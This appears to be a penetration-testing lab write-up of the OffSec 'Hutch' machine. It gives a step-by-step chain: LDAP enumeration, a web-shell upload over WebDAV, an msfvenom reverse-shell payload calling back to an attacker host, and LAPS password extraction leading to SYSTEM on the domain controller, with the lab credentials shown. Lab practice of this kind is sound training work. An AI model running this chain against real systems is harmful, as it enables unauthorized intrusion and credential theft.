
To enumerate LDAP -> revealing the domain 
```
nmap -n -sV -Pn -script "ldap* and not brute" TARGET
```

To use the CN to get more info some (additional info)
```
ldapsearch -x -H ldap://$ip -b “dc=Kyotosoft,DC=com”
```

To enumerate further -> (got a user and a password)
```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://TARGET" "(objectclass=*)"
```
Next I grepped the ldap_search.txt file for the **description** field because it is common to find passwords in there — and I found one!!!

To connect, must have password -> 
```
cadaver http://TARGET
```

![Pasted image 20240325183420.png](Evidence/Pasted%20image%2020240325183420.png)

![Pasted image 20240325183437.png](Evidence/Pasted%20image%2020240325183437.png)

Upload web shell -> 
![Pasted image 20240325183740.png](Evidence/Pasted%20image%2020240325183740.png)

URL = 
```
http://TARGET/cmdasp.aspx
```

create payload ->
```
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe > reverse.exe
```

Upload payload ->
```
dav:/> put reverse.exe
```

confirm the payload is present on the web shell ->
```
dir C:\inetpub\wwwroot
```

call the payload with a listener -> 
```
C:\inetpub\wwwroot\reverse.exe
```

Prive Esc ->

After going through the system we do see that LAPS has been installed on the server.
![Pasted image 20240325191148.png](Evidence/Pasted%20image%2020240325191148.png)

Its possible that LAPS or LDAP has been misconfigured enough to potentially contains the computer passwords for computer object in AD. Knowing this we can go back and search LDAP with the credentials with have specifically looking for the ms-Mcs-AdmPwd attribute.

```
ldapsearch -x -H 'ldap://TARGET' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
```

We can see for the domain controller the LAPS password set is `J6QOuU+lhs[SH/` I then confirmed the credentials with `crackmapexec` against LDAP using the local administrator account and was given successful confirmation.

![Pasted image 20240325191325.png](Evidence/Pasted%20image%2020240325191325.png)

I was then able to use these credentials with Impacket's psexec.py to gain access to the Domain Controller as SYSTEM.

![Pasted image 20240325191353.png](Evidence/Pasted%20image%2020240325191353.png)

